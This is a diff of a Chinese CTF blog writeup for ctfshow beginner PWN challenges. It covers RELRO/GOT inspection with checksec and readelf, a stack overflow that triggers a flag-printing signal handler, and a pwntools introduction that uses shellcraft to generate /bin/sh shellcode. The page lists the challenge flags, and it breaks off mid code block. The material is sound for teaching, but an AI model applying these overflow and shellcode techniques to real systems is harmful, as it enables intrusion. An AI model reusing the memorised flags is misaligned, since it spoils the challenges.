@@ -10,7 +10,7 @@
 <meta property='og:description' content="二进制漏洞与利用，PWN_wrtieup，会员套餐360题">
 <meta property='og:url' content='https://expl0rer.top/p/ctfshow-pwn-writeup/'>
 <meta property='og:site_name' content='Expl0rer.Ct'>
-<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2025-08-27T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2025-08-28T21:53:34&#43;08:00'/><meta property='og:image' content='https://expl0rer.top/p/ctfshow-pwn-writeup/ctfshow.png' />
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2025-08-27T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2025-08-29T20:56:26&#43;08:00'/><meta property='og:image' content='https://expl0rer.top/p/ctfshow-pwn-writeup/ctfshow.png' />
 <meta name="twitter:title" content="ctfshow-pwn-writeup">
 <meta name="twitter:description" content="二进制漏洞与利用，PWN_wrtieup，会员套餐360题"><meta name="twitter:card" content="summary_large_image">
     <meta name="twitter:image" content='https://expl0rer.top/p/ctfshow-pwn-writeup/ctfshow.png' />
@@ -746,6 +746,22 @@ unicode: "ece7"
         <li><a href="#pwn_018">PWN_018</a></li>
         <li><a href="#pwn_019">PWN_019</a></li>
         <li><a href="#pwn_020">PWN_020</a></li>
+        <li><a href="#pwn_021">PWN_021</a></li>
+        <li><a href="#pwn_021-1">PWN_021</a></li>
+        <li><a href="#pwn_023">PWN_023</a></li>
+        <li><a href="#pwn_024">PWN_024</a>
+          <ol>
+            <li><a href="#题目">题目：</a></li>
+            <li><a href="#与目标程序交互">与目标程序交互</a></li>
+            <li><a href="#二进制数据处理">二进制数据处理</a></li>
+            <li><a href="#辅助漏洞利用">辅助漏洞利用</a></li>
+            <li><a href="#密码学相关辅助">密码学相关辅助</a></li>
+            <li><a href="#多线程和异步支持">多线程和异步支持</a></li>
+            <li><a href="#题目后续">题目后续：</a></li>
+            <li><a href="#逐行解析手敲shellcode">逐行解析手敲shellcode</a></li>
+          </ol>
+        </li>
+        <li><a href="#pwn_025">PWN_025</a></li>
       </ol>
     </li>
   </ol>
@@ -834,9 +850,9 @@ unicode: "ece7"
     
     
     <p>[TOC]</p>
-<p><strong>前文：以下是我<a class="link" href="https://ctf.show/challenges"  target="_blank" rel="noopener"
-    >ctfshow</a>的PWN做题记录，欢迎各位前来观看，小弟领教！</strong></p>
-<p>前文：每题我都放了链接，供下载，要靶场的题不能做，PWN_005 <del>PWN_016，PWN_20~~PWN_022，PWN_026</del>PWN_029不需要靶场是可以做的，供大家食用PWN。</p>
+<p>**前文：以下是我<a class="link" href="https://ctf.show/challenges"  target="_blank" rel="noopener"
+    >ctfshow</a>的PWN做题记录，欢迎各位前来观看，小弟领教！**还有就是ctfshow-pwn是我入门PWN的第一套题，比较基础，看官方writeup可以知道比较简洁，但有些我看不懂，这是我自己做的过程中写的，都是发自内心理解它们的话，有些可能比较啰嗦，但也必须这样，因为站在新手角度来看必须要这种啰嗦方式去理解才能更深刻，有耐心的朋友可以一直看下去，当然也欢迎PWN大佬前来挑战我！！！😄</p>
+<p>前文：每题我都放了链接，供下载，要靶场的题不能做，PWN_005&ndash;PWN_016，PWN_20&ndash;PWN_022，PWN_026&ndash;PWN_029不需要靶场是可以做的，供大家食用PWN。</p>
 <h2 id="test_your_nc">Test_your_nc
 </h2><h3 id="pwn_000">PWN_000
 </h3><p><a class="link" href="https://pan.baidu.com/s/1wHPhZ7XOouFU6KgyOiSfLQ"  target="_blank" rel="noopener"
@@ -2034,6 +2050,797 @@ unicode: "ece7"
 <p>如不存在.got.plt表，则最终flag值为ctfshow{1_0_0x400820}</p>
 <p><a class="link" href="PWN_020" >PWN_020</a></p>
 <hr>
+<p>checksec一下：</p>
+<p><img src="/p/ctfshow-pwn-writeup/50.png"
+	width="600"
+	height="155"
+	srcset="/p/ctfshow-pwn-writeup/50_hu_5395d84a6ce1faca.png 480w, /p/ctfshow-pwn-writeup/50_hu_d78e65288b53f8ce.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="387"
+		data-flex-basis="929px"
+	
+></p>
+<p>在这里只开了NX保护。</p>
+<p><img src="/p/ctfshow-pwn-writeup/51.png"
+	width="755"
+	height="264"
+	srcset="/p/ctfshow-pwn-writeup/51_hu_ec1407a9bbbb57d8.png 480w, /p/ctfshow-pwn-writeup/51_hu_5eec920743e7e000.png 1024w"
+	loading="lazy"
+	
+		alt="Hint提示：什么是RETRO保护"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="285"
+		data-flex-basis="686px"
+	
+></p>
+<p>在<a class="link" href="https://expl0rer.top/p/pwn-1/#relro"  target="_blank" rel="noopener"
+    >PWN-1的Linux安全防护机制</a>这一章的学习中，我们有认识到RELRO这个保护。很显然no RELRO意味着.got和.got.plt表都可写。</p>
+<p>用指令查表地址：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">readelf -S PWN_020
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/ctfshow-pwn-writeup/52.png"
+	width="1044"
+	height="630"
+	srcset="/p/ctfshow-pwn-writeup/52_hu_9e02d9e9ca78633b.png 480w, /p/ctfshow-pwn-writeup/52_hu_cfc6139e4ad6cdf.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="165"
+		data-flex-basis="397px"
+	
+></p>
+<p>耐心找一下就找到了，故flag:ctfshow{1_1_0x600f18_0x600f28}</p>
+<h3 id="pwn_021">PWN_021
+</h3><p>题目：提交ctfshow{【.got表与.got.plt是否可写(可写为1，不可写为0)】,【.got的地址】,【.got.plt的地址】}</p>
+<p>例如 .got可写.got.plt表可写其地址为0x400820 0x8208820</p>
+<p>最终flag为ctfshow{1_1_0x400820_0x8208820}</p>
+<p>若某个表不存在，则无需写其对应地址</p>
+<p>如不存在.got.plt表，则最终flag值为ctfshow{1_0_0x400820}</p>
+<p><a class="link" href="PWN_021" >PWN_021</a></p>
+<hr>
+<p>checksec一下：</p>
+<p><img src="/p/ctfshow-pwn-writeup/53.png"
+	width="1215"
+	height="610"
+	srcset="/p/ctfshow-pwn-writeup/53_hu_8be2513129fe3dd3.png 480w, /p/ctfshow-pwn-writeup/53_hu_b1f2d1e70b5f95ba.png 1024w"
+	loading="lazy"
+	
+		alt="partial Relro保护"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="199"
+		data-flex-basis="478px"
+	
+></p>
+<p>要还不记得Relro保护机制原理的就回PWN-1去看吧&hellip;</p>
+<p>这里是 GOT 表的前半部分（.got.plt）设置为只读，后半部分（.got）仍可写。</p>
+<p>用readelf命令去爱看表地址就好了：</p>
+<p><img src="/p/ctfshow-pwn-writeup/54.png"
+	width="670"
+	height="114"
+	srcset="/p/ctfshow-pwn-writeup/54_hu_8d769b287fb3ac64.png 480w, /p/ctfshow-pwn-writeup/54_hu_3cbf63d5305f0ffc.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="587"
+		data-flex-basis="1410px"
+	
+></p>
+<p>flag:ctfshow{0_1_0x600ff0_0x601000}</p>
+<h3 id="pwn_021-1">PWN_021
+</h3><p>题目：提交ctfshow{【.got表与.got.plt是否可写(可写为1，不可写为0)】,【.got的地址】,【.got.plt的地址】}</p>
+<p>例如 .got可写.got.plt表可写其地址为0x400820 0x8208820</p>
+<p>最终flag为ctfshow{1_1_0x400820_0x8208820}</p>
+<p>若某个表不存在，则无需写其对应地址</p>
+<p>如不存在.got.plt表，则最终flag值为ctfshow{1_0_0x400820}</p>
+<p><a class="link" href="PWN_021" >PWN_021</a></p>
+<hr>
+<p>道理一样checksec看relro的保护、readelf看表&hellip;..</p>
+<p><img src="/p/ctfshow-pwn-writeup/55.png"
+	width="725"
+	height="153"
+	srcset="/p/ctfshow-pwn-writeup/55_hu_4f21e41ae9717f96.png 480w, /p/ctfshow-pwn-writeup/55_hu_9ef604a41c7706ab.png 1024w"
+	loading="lazy"
+	
+		alt=".got、.got.plt表都不可写"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="473"
+		data-flex-basis="1137px"
+	
+></p>
+<p><img src="/p/ctfshow-pwn-writeup/56.png"
+	width="705"
+	height="101"
+	srcset="/p/ctfshow-pwn-writeup/56_hu_fd84664444ae0205.png 480w, /p/ctfshow-pwn-writeup/56_hu_beb3fc8924561d37.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="698"
+		data-flex-basis="1675px"
+	
+></p>
+<p>这次就只有一个.got表了，那就是flag：ctfshow{0_0_0x600fc0}</p>
+<h3 id="pwn_023">PWN_023
+</h3><p>题目：用户名为 ctfshow 密码 为 123456 请使用 ssh软件连接</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ssh ctfshow@题目地址 -p题目端口号
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>不是nc连接</strong>   <a class="link" href="PWN_023" >PWN_023</a></p>
+<p><img src="/p/ctfshow-pwn-writeup/57.png"
+	width="695"
+	height="140"
+	srcset="/p/ctfshow-pwn-writeup/57_hu_55b6f42bf446c46b.png 480w, /p/ctfshow-pwn-writeup/57_hu_a8dd5de87eab3f4f.png 1024w"
+	loading="lazy"
+	
+		alt="checksec一下"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="496"
+		data-flex-basis="1191px"
+	
+></p>
+<p>没有canary保护，这可以是个突破点：栈溢出漏洞。</p>
+<p>看回IDA：</p>
+<p><img src="/p/ctfshow-pwn-writeup/58.png"
+	width="1060"
+	height="615"
+	srcset="/p/ctfshow-pwn-writeup/58_hu_803795aedfc75284.png 480w, /p/ctfshow-pwn-writeup/58_hu_31f0d9d5938f057f.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="172"
+		data-flex-basis="413px"
+	
+></p>
+<p>跟进ctfshow函数</p>
+<p><img src="/p/ctfshow-pwn-writeup/59.png"
+	width="669"
+	height="159"
+	srcset="/p/ctfshow-pwn-writeup/59_hu_14eb223bc3e77877.png 480w, /p/ctfshow-pwn-writeup/59_hu_99cf8a4061518c1e.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="420"
+		data-flex-basis="1009px"
+	
+></p>
+<p>可以知道，一开始dgets函数读取flag字符串到内存中</p>
+<p>跟进signal函数：</p>
+<p><img src="/p/ctfshow-pwn-writeup/60.png"
+	width="529"
+	height="139"
+	srcset="/p/ctfshow-pwn-writeup/60_hu_e4f58d85598c5ca3.png 480w, /p/ctfshow-pwn-writeup/60_hu_e7413abc36f52d2b.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="380"
+		data-flex-basis="913px"
+	
+></p>
+<p>这行代码会将内存中存储的 <code>flag</code> 字符串，输出到标准错误流（<code>stderr</code>）。因为程序启动时已经通过 <code>fgets</code> 从 <code>/ctfshow_flag</code> 文件读取了 flag 内容到 <code>flag</code> 变量中，所以这里能直接打印出正确的 flag。</p>
+<p>所以说我们让程序报错也就是让它栈溢出，覆盖后的地址还不能是有效地址，让它全部报错，也就是我们可以输入好多个a就行，几十个a的16进制地址是无效地址。</p>
+<p><img src="/p/ctfshow-pwn-writeup/61.png"
+	width="945"
+	height="394"
+	srcset="/p/ctfshow-pwn-writeup/61_hu_dbfd74188df09469.png 480w, /p/ctfshow-pwn-writeup/61_hu_a8d8dd6c093b2cde.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="239"
+		data-flex-basis="575px"
+	
+></p>
+<p>关于栈溢出这部分，请看<a class="link" href="https://expl0rer.top/p/pwn-2/"  target="_blank" rel="noopener"
+    >PWN-2</a>详细学习，PWN板块占比也是重要的。</p>
+<p>逐渐开始上强度了，这时需要仔细看IDA的代码分析了，看看是什么工作原理。</p>
+<p>flag：ctfshow{0f207f1f-71bb-4cdd-bdab-7bfb9acde27a}</p>
+<h3 id="pwn_024">PWN_024
+</h3><h4 id="题目">题目：
+</h4><p>你可以使用<code>pwntools</code>的<code>shellcraft</code>模块来进行攻击</p>
+<p><a class="link" href="PWN_024" >PWN_024</a></p>
+<p>我来介绍一下shellcraft模块：它是 pwntools 库中的一个子模块，用于生成各种不同体系结构的 Shellcode（这里的不同体系是我们之前学过的<a class="link" href="https://expl0rer.top/p/%e7%bd%91%e5%ae%89%e5%ad%a6%e4%b9%a0%e7%ac%ac%e4%b8%80%e9%98%b6%e6%ae%b5/#%e6%93%8d%e4%bd%9c%e7%b3%bb%e7%bb%9f%e5%9f%ba%e7%a1%80"  target="_blank" rel="noopener"
+    >操作系统基础的有关shell的那一章节</a>）有zsh、bash等。Shellcode 是一段以二进制形式编写的代码，用于利用软件漏洞、执行特定操作或获取系统权限。shellcraft 模块提供了一系列函数和方法，用于生成特定体系结构下的Shellcode。</p>
+<p>生成的汇编代码可直接通过 asm() 函数转换为机器码（二进制），无需手动处理格式，例如：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">i386</span><span class="o">.</span><span class="n">sh</span><span class="p">())</span>  <span class="c1"># 一步完成“汇编模板→机器码”转换，类似C语言的编译器功能，转换成机器语言。</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>IDA：可以看到这题似乎和ret2shellcode有关</p>
+<p><img src="/p/ctfshow-pwn-writeup/63.png"
+	width="1045"
+	height="415"
+	srcset="/p/ctfshow-pwn-writeup/63_hu_8320440ce8e9ad20.png 480w, /p/ctfshow-pwn-writeup/63_hu_f063bc9aa051b388.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="251"
+		data-flex-basis="604px"
+	
+></p>
+<p>看题目提示，进入新大陆了&hellip;用pwntools了。</p>
+<p><img src="/p/ctfshow-pwn-writeup/64.png"
+	width="710"
+	height="295"
+	srcset="/p/ctfshow-pwn-writeup/64_hu_2df4fc228f333ed2.png 480w, /p/ctfshow-pwn-writeup/64_hu_ff2fcff08e5e36b.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="240"
+		data-flex-basis="577px"
+	
+></p>
+<p>这里有提示，可以看一下<a class="link" href="https://expl0rer.top/p/pwn-1/#nx"  target="_blank" rel="noopener"
+    >PWN-1-NX保护</a>，有啥启发？</p>
+<p>在IDA分析可知，ctfshow函数无法跟进源代码，只能看它的伪代码去分析了（比较长）：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-nasm" data-lang="nasm"><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">C6</span> <span class="c1">; =============== S U B R O U T I N E =======================================</span>
+</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">C6</span>
+</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">C6</span> <span class="c1">; Attributes: bp-based frame</span>
+</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">C6</span>
+</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">C6</span> <span class="c1">; int __cdecl ctfshow(_DWORD)</span>
+</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">C6</span>                 <span class="nv">public</span> <span class="nv">ctfshow</span>
+</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">C6</span> <span class="nv">ctfshow</span>         <span class="nv">proc</span> <span class="nv">near</span>               <span class="c1">; CODE XREF: main+132↓p</span>
+</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">C6</span>
+</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">C6</span> <span class="nv">buf</span>             <span class="err">=</span> <span class="kt">byte</span> <span class="nv">ptr</span> <span class="o">-</span><span class="mh">88h</span>
+</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">C6</span> <span class="nv">var_4</span>           <span class="err">=</span> <span class="kt">dword</span> <span class="nv">ptr</span> <span class="o">-</span><span class="mi">4</span>
+</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">C6</span>
+</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">C6</span> <span class="c1">; __unwind {</span>
+</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">C6</span>                 <span class="nv">push</span>    <span class="nb">ebp</span>
+</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">C7</span>                 <span class="nv">mov</span>     <span class="nb">ebp</span><span class="p">,</span> <span class="nb">esp</span>
+</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">C9</span>                 <span class="nv">push</span>    <span class="nb">ebx</span>
+</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">CA</span>                 <span class="nv">sub</span>     <span class="nb">esp</span><span class="p">,</span> <span class="mh">84h</span>
+</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">D0</span>                 <span class="nv">call</span>    <span class="nv">__x86_get_pc_thunk_bx</span>
+</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">D5</span>                 <span class="nv">add</span>     <span class="nb">ebx</span><span class="p">,</span> <span class="p">(</span><span class="nv">offset</span> <span class="nv">_GLOBAL_OFFSET_TABLE_</span> <span class="o">-</span> <span class="kc">$</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="kd">DB</span>                 <span class="nv">sub</span>     <span class="nb">esp</span><span class="p">,</span> <span class="mi">4</span>
+</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">DE</span>                 <span class="nv">push</span>    <span class="mh">100h</span>            <span class="c1">; nbytes</span>
+</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">E3</span>                 <span class="nv">lea</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">buf</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">E9</span>                 <span class="nv">push</span>    <span class="nb">eax</span>             <span class="c1">; buf</span>
+</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">EA</span>                 <span class="nv">push</span>    <span class="mi">0</span>               <span class="c1">; fd</span>
+</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">EC</span>                 <span class="nv">call</span>    <span class="nv">_read</span>
+</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">F1</span>                 <span class="nv">add</span>     <span class="nb">esp</span><span class="p">,</span> <span class="mh">10h</span>
+</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">F4</span>                 <span class="nv">sub</span>     <span class="nb">esp</span><span class="p">,</span> <span class="mh">0Ch</span>
+</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">F7</span>                 <span class="nv">lea</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">buf</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">FD</span>                 <span class="nv">push</span>    <span class="nb">eax</span>             <span class="c1">; s</span>
+</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">FE</span>                 <span class="nv">call</span>    <span class="nv">_puts</span>
+</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">08048503</span>                 <span class="nf">add</span>     <span class="nb">esp</span><span class="p">,</span> <span class="mh">10h</span>
+</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">08048506</span>                 <span class="nf">lea</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">buf</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">0804850</span><span class="nf">C</span>                 <span class="nv">call</span>    <span class="nb">eax</span>
+</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">0804850</span><span class="nf">E</span>                 <span class="nv">nop</span>
+</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">0804850</span><span class="nf">F</span>                 <span class="nv">mov</span>     <span class="nb">ebx</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var_4</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">08048512</span>                 <span class="nf">leave</span>
+</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">08048513</span>                 <span class="nf">retn</span>
+</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">08048513</span> <span class="c1">; } // starts at 80484C6</span>
+</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">08048513</span> <span class="nf">ctfshow</span>         <span class="nv">endp</span>
+</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">08048513</span>
+</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">08048514</span>
+</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">08048514</span> <span class="c1">; =============== S U B R O U T I N E =======================================</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><blockquote>
+<p>如果之前是打逆向或者强行入门PWN的话，最坐牢的我相信应该是用IDA吧，除了找明文字符串flag外，你学了汇编语言你也看不懂这是啥意思，感觉一小串源代码转换成汇编语言非常长、枯燥，其实UP主也深有体会，在系统性入门后，也初步知道IDA是怎么用的，这里我把下划线“===== S U B R O U T I N E =====”也复制进来了，按我理解这是函数分界，分隔线上方是前一个函数的结尾（通常以<code>retn</code>指令结束，代表函数返回）过了这条线，说明汇编语言在描述的就是另外一个函数了。也就是说这上下分界线是代表囊括着一个函数，例如这ctfshow函数。</p>
+<p>另外我想说的是汇编语言这么长是有道理的，它更像是一种“啰嗦”，它能在每一段代码运行后不断向你汇报地址变化，这种 “啰嗦” 本质上是<strong>对计算机底层操作的直接映射</strong>，这种特性确实让它在跟踪程序运行细节、分析逻辑和排查问题时具有独特优势。</p></blockquote>
+<p>从这里开始就要用pwntools了，这里介绍一下：</p>
+<blockquote class="alert alert-note">
+    <blockquote>
+<p><code>from pwn import *</code> 是在 Python 中使用 <code>pwntools</code> 库的常见导入方式 。<code>pwntools</code> 是一个功能强大的用于二进制漏洞利用（binary exploitation）的 Python 库，在 CTF（Capture The Flag，夺旗赛 ）竞赛、安全研究以及漏洞分析等领域广泛应用，以下是其具体作用：</p>
+<h4 id="与目标程序交互">与目标程序交互
+</h4><ul>
+<li><strong>本地进程交互</strong>：<code>pwntools</code> 能轻松创建本地进程，模拟用户输入、获取程序输出。例如，<code>p = process('./vulnerable_program')</code> 可以启动本地的可执行文件 <code>vulnerable_program</code>，然后通过 <code>p.sendline('input data')</code> 向程序发送数据，用 <code>p.recvuntil('prompt')</code> 接收程序输出直到遇到特定字符串。</li>
+<li><strong>远程服务器交互</strong>：在面对远程存在漏洞的服务时，<code>pwntools</code> 提供了便捷的方法。比如 <code>r = remote('target.com', 8080)</code> 可以连接到 <code>target.com</code> 服务器的 8080 端口，后续同样能发送和接收数据，方便对远程服务进行测试和漏洞利用。</li>
+</ul>
+<h4 id="二进制数据处理">二进制数据处理
+</h4><ul>
+<li><strong>数据打包和解包</strong>：在二进制程序中，经常需要处理不同字节序（大端序、小端序）的数据。<code>pwntools</code> 提供了 <code>pack</code> 和 <code>unpack</code> 函数，比如 <code>p32(0x12345678)</code> 可以将整数 <code>0x12345678</code> 按照小端序打包成 4 字节的二进制数据；<code>u32(data)</code> 则可以将 4 字节的二进制数据按照小端序解包为整数。</li>
+<li><strong>数据转换</strong>：它还支持各种数据格式之间的转换，如将字符串转换为字节串，或者进行十六进制与二进制数据之间的转换等。</li>
+</ul>
+<h4 id="辅助漏洞利用">辅助漏洞利用
+</h4><ul>
+<li><strong>生成 Payload</strong>：对于缓冲区溢出等漏洞，需要精心构造 Payload（攻击载荷）。<code>pwntools</code> 提供了生成填充数据、构造 ROP（Return-Oriented Programming，返回导向编程 ）链等功能。比如 <code>cyclic(100)</code> 可以生成一个 100 字节的循环模式字符串，用于确定缓冲区溢出的偏移量；通过 <code>ROP</code> 模块可以方便地构建 ROP 链来绕过一些安全机制，实现代码执行。</li>
+<li><strong>符号解析</strong>：在分析二进制程序时，有时需要解析程序中的函数地址、变量地址等。<code>pwntools</code> 可以与 <code>ELF</code>（Executable and Linkable Format，可执行与可链接格式，常用于 Linux 系统中的可执行文件、共享库等 ）文件交互，获取这些符号信息，例如 <code>elf = ELF('./target_binary')</code> 可以加载目标二进制文件，然后通过 <code>elf.symbols['main']</code> 获取 <code>main</code> 函数的地址。</li>
+</ul>
+<h4 id="密码学相关辅助">密码学相关辅助
+</h4><p>在 CTF 中，有时会涉及密码学题目，<code>pwntools</code> 也提供了一些基础的密码学辅助功能，比如常见加密算法的简单实现、编码解码等。</p>
+<h4 id="多线程和异步支持">多线程和异步支持
+</h4><p><code>pwntools</code> 一定程度上支持多线程和异步操作，这在同时与多个目标程序交互，或者需要在等待程序输出的同时执行其他任务时非常有用。</p></blockquote></blockquote>
+<p>所以为啥要学<a class="link" href="https://expl0rer.top/p/python/"  target="_blank" rel="noopener"
+    >Python</a>，当然能用<a class="link" href="https://www.doubao.com/chat/?from_logout=1"  target="_blank" rel="noopener"
+    >豆包</a>、<a class="link" href="https://www.deepseek.com/"  target="_blank" rel="noopener"
+    >DeepSeek</a>之类的AI帮你写代码exp，但你得先了解<a class="link" href="https://expl0rer.top/p/python/"  target="_blank" rel="noopener"
+    >Python</a>再让它写才对的，有时会出错，你得有判断力。</p>
+<blockquote>
+<p>这里推荐使用Pycharm、Visual Studio Code；或者你可以在Kali上用终端来运行，这样你在Kali用nc连接靶机时在同一系统运行交互比较方便，当然Pycharm、Visual Studio Code也有终端功能，只不过要配PWN环境稍微麻烦而已，看你习不习惯用Linux系统吧。</p></blockquote>
+<h4 id="题目后续">题目后续：
+</h4><p>讲得比较啰嗦，这里开始分析这段汇编代码（重新粘贴了一遍，和上面一样）：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
